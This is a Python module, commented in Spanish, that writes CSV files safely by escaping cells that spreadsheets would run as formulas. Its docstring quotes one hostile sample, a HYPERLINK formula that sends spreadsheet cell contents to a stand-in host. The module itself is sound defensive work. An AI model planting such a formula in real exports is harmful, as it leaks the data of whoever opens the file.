"""Escritor CSV que neutraliza la inyeccion de formulas.

Excel y LibreOffice ejecutan como formula cualquier celda que empiece por = + - @
(o tabulador / retorno): un producto llamado `=HYPERLINK("http://x/?"&A1,"clic")`
se convertia en un enlace que filtra el resto de la hoja al abrir el export.
Se antepone una comilla simple, que el programa de hojas no muestra.
"""
import csv
import re

_PELIGROSOS = ("=", "+", "-", "@", "\t", "\r")


_NUMERO = re.compile(r"^[-+]?\d+(?:[.,]\d+)?$")  # "-5,00" es un numero, no una formula


def proteger(valor):
    if isinstance(valor, str) and valor.startswith(_PELIGROSOS) and not _NUMERO.match(valor):
        return "'" + valor
    return valor


class EscritorCsvSeguro:
    def __init__(self, destino, delimiter=";"):
        self._writer = csv.writer(destino, delimiter=delimiter)

    def writerow(self, fila):
        # Los numeros negativos de verdad (int/float) no son texto y no se tocan.
        self._writer.writerow([proteger(v) for v in fila])


def desproteger(valor):
    """Inversa de proteger() al importar un CSV exportado por la propia app."""
    if isinstance(valor, str) and len(valor) > 1 and valor[0] == "'" and valor[1] in "=+-@\t\r":
        return valor[1:]
    return valor
